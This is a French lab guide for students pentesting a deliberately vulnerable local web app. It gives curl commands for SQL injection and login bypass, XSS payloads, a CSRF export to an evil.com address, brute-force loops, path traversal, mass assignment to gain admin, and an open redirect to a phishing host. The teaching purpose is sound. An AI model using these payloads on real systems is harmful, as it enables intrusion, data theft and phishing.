# TP Réel — Chapitre 2 (v2) : DataCorp Analytics
## Guide étudiant — Pentest applicatif

> ⚠️ Application intentionnellement vulnérable (`app_v2.py`). Ne jamais déployer hors de votre environnement Docker local.

---

## 1. Mise en place

```bash
docker-compose up -d
curl -i http://localhost:5000/
```

Comptes fournis : `admin/password123`, `analyst/123456`, `datascientist/analyst`.

Consultez également les ressources de contexte fournies (`TP_Reel_Ressources_Contexte.md`) : schéma de chaîne de valeur, extrait de configuration du bucket `datacorp-exports`, journal d'accès simplifié — elles vous serviront à motiver l'impact réel de certaines vulnérabilités dans votre rapport.

---

## 2. Endpoints à cartographier (Phase 1 — Recon)

| Endpoint | Méthodes |
|---|---|
| `/login` | GET, POST |
| `/register` | GET, POST |
| `/dashboard` | GET |
| `/search` | GET |
| `/comments`, `/api/comments` | GET, POST |
| `/export` | GET, POST |
| `/articles/<id>` | GET |
| `/download` | GET |
| `/api/users` | GET |
| `/logout` | GET |

À vous de déterminer, pour chaque endpoint, s'il vérifie réellement une session avant de répondre — ne vous fiez pas au menu affiché.

---

## 3. Commandes de pentest

`TARGET=http://localhost:5000` dans tous les exemples ci-dessous.

### 3.1 Authentication bypass (`/login`)

```bash
curl -i -X POST "$TARGET/login" \
    --data-urlencode "username=admin' OR '1'='1--" \
    --data-urlencode "password=anything"
```

### 3.2 SQL Injection dans `/search`

```bash
curl -s -G "$TARGET/search" --data-urlencode "q=' OR '1'='1"
curl -s -G "$TARGET/search" \
    --data-urlencode "q=' UNION SELECT 1, username, password, email FROM users--"
time curl -s -G "$TARGET/search" --data-urlencode "q=' AND SLEEP(5)--"
```

### 3.3 XSS réfléchie (`/search`)

```bash
curl -s -G "$TARGET/search" --data-urlencode "q=<script>alert('XSS')</script>"
curl -s -G "$TARGET/search" --data-urlencode "q=<img src=x onerror=alert('XSS')>"
```

### 3.4 XSS stockée (`/api/comments`)

```bash
curl -i -X POST "$TARGET/api/comments" \
    --data-urlencode "name=attacker" \
    --data-urlencode "comment=<img src=x onerror=\"console.log('XSS')\">"
curl -s "$TARGET/comments"
```

### 3.5 CSRF sur `/export`

```bash
curl -i -X POST "$TARGET/export" \
    --data-urlencode "format=csv" \
    --data-urlencode "email=attacker@evil.com"
```

### 3.6 Politique de mot de passe faible

```bash
curl -i -X POST "$TARGET/register" \
    --data-urlencode "username=weakuser1" \
    --data-urlencode "password=123" \
    --data-urlencode "email=weakuser1@test.com"
```

### 3.7 Rate limiting absent

```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "$TARGET/login" \
      --data-urlencode "username=admin" \
      --data-urlencode "password=attempt$i"
done
echo ""
```

### 3.8 Information disclosure (`/api/users`)

```bash
curl -s "$TARGET/api/users" | python3 -m json.tool
```

### 3.9 NOUVEAU — IDOR (`/articles/<id>`)

```bash
curl -s "$TARGET/articles/1"
curl -s "$TARGET/articles/2"
# Testez systématiquement les id suivants : y a-t-il un contenu auquel vous
# ne devriez pas avoir accès sans authentification ni rôle admin ?
curl -s "$TARGET/articles/3"
curl -s "$TARGET/articles/4"
```

Consigne : documentez précisément quel id révèle une information sensible, et pourquoi son contenu ne devrait pas être accessible sans contrôle de rôle.

### 3.10 NOUVEAU — Path Traversal (`/download`)

```bash
# Usage normal
curl -s "$TARGET/download?file=rapport_public.csv"

# Sortie du répertoire prévu : à vous de trouver la profondeur de ../ nécessaire
curl -s "$TARGET/download?file=../app_v2.py"
curl -s "$TARGET/download?file=../requirements.txt"
```

Consigne : une fois l'accès hors-répertoire confirmé, listez au moins deux fichiers du conteneur que vous avez pu lire et qui ne devraient pas être exposés par cette fonctionnalité.

### 3.11 NOUVEAU — Mass Assignment (`/register`)

```bash
# Le formulaire HTML n'expose pas de champ "role" — injectez-le directement
curl -i -X POST "$TARGET/register" \
    --data-urlencode "username=hacker_admin" \
    --data-urlencode "password=Test1234!" \
    --data-urlencode "email=hacker@test.com" \
    --data-urlencode "role=admin"

# Vérifiez ensuite le rôle obtenu :
curl -i -X POST "$TARGET/login" \
    --data-urlencode "username=hacker_admin" \
    --data-urlencode "password=Test1234!"
```

Consigne : confirmez que le compte créé a bien le rôle `admin` (via `/api/users` ou le dashboard après connexion), et expliquez pourquoi cette vulnérabilité est particulièrement grave comparée aux autres (elle donne directement un privilège, pas juste une donnée).

### 3.12 NOUVEAU — Open Redirect (`/login?next=`)

```bash
curl -i "$TARGET/login?next=http://evil-phishing-site.test"
# Puis simulez une connexion avec ce next :
curl -i -X POST "$TARGET/login" \
    --data-urlencode "username=admin" \
    --data-urlencode "password=password123" \
    --data-urlencode "next=http://evil-phishing-site.test"
```

Consigne : décrivez un scénario de phishing réaliste exploitant cette redirection (un lien `datacorp.local/login?next=...` reste crédible car le domaine affiché est le vrai domaine DataCorp).

---

## 4. Travail attendu

1. Reprendre la checklist (`CHECKLIST_TP_REEL_Ch2.md`) en l'étendant aux 4 nouvelles vulnérabilités (V8-V11).
2. Compléter le template Phase 3/4 (`TP_Reel_Template_Etudiant.md`) — preuves, scénario chaîné, matrice, plan de correction — en intégrant désormais 11 lignes + le bonus (12 au total) dans votre matrice d'impact.
3. Au moins un scénario chaîné doit désormais mêler une vulnérabilité "classique" (V1-V7) et une nouvelle (V8-V11) — par exemple Mass Assignment (V10) pour obtenir un rôle admin, puis Path Traversal (V9) pour lire un fichier de configuration.
4. Consultez `Explication_Attaques.md` pour la partie théorique de chaque famille de vulnérabilité — elle est attendue dans votre rapport en introduction de chaque preuve de concept (2-3 phrases expliquant le mécanisme avant de montrer l'exploitation).

Nom de fichier de rendu inchangé : `TP_REEL_Secu1_Chapitre2_[NOM]_[PRENOM].md`.
